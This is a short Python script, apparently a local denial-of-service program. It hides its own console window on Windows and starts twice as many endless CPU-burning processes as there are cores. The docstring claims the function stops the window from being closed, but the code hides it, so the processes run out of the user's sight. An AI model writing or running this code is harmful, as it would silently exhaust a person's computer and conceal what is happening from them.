import multiprocessing
import ctypes
import os
import sys

def prevent_close():
    """Prevent the console window from being closed (Windows only)."""
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # Hide window

def overload():
    while True:
        for _ in range(10**6):
            pass  # Burn CPU cycles

if __name__ == "__main__":
    prevent_close()
    for _ in range(multiprocessing.cpu_count() * 2):  # Overload even with hyper-threading
        multiprocessing.Process(target=overload).start()
